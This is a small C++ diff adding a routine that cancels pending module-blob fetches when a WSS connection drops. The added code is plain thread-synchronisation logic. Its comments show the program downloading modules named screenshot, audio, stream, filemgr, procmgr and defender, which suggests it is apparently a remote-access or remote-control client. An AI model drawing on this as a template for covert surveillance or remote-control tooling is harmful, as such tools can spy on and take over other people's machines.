@@ -275,6 +275,29 @@ public:
         pf->cv.notify_all();
     }
 
+    // Called from main.cpp whenever the WSS connection drops. Without this,
+    // any fetch_blob_sync waiting for a response that was in flight at the
+    // time of the disconnect would block for the full timeout (15s default),
+    // holding up subsequent prefetches. Failing them fast lets the prefetch
+    // loop move on to the next module via the new connection.
+    void cancel_all_pending_fetches() {
+        std::vector<std::shared_ptr<PendingFetch>> waiters;
+        {
+            std::lock_guard<std::mutex> lk(pending_mu_);
+            for (auto& kv : pending_fetches_) waiters.push_back(kv.second);
+            pending_fetches_.clear();
+        }
+        for (auto& pf : waiters) {
+            {
+                std::lock_guard<std::mutex> lk(pf->mu);
+                pf->ok   = false;
+                pf->blob.clear();
+                pf->done = true;
+            }
+            pf->cv.notify_all();
+        }
+    }
+
     // Kick off a background thread that fetches every known module blob
     // (screenshot, audio, stream, filemgr, procmgr, defender). Safe to call
     // repeatedly — concurrent calls share the same thread once it finishes.
